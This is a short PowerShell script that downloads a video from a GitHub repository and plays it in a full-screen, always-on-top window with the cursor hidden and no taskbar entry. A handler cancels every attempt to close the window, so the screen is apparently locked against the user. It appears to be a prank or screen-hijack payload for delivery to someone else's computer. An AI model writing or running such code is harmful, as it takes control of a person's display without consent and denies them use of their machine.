[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

# Прямая ссылка на твое видео
$u = 'https://raw.githubusercontent.com/ymkeee/T-Embed/main/assets/edit.mp4'
$f = "$env:TEMP\$([Guid]::NewGuid()).mp4"

try {
    Invoke-WebRequest -Uri $u -OutFile $f
} catch { exit }

[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        WindowStyle="None" WindowState="Maximized" Topmost="True" 
        Background="Black" Cursor="None" ShowInTaskbar="False">
    <Grid><MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" /></Grid>
</Window>
"@

$reader = New-Object System.Xml.XmlNodeReader $xaml
$w = [Windows.Markup.XamlReader]::Load($reader)
$v = $w.FindName("v")
$v.add_MediaEnded({ $w.Close() })
$w.Add_Closing({ $_.Cancel = $true })

$w.ShowDialog() | Out-Null

Start-Sleep -Seconds 1
if (Test-Path $f) { Remove-Item -Path $f -Force }
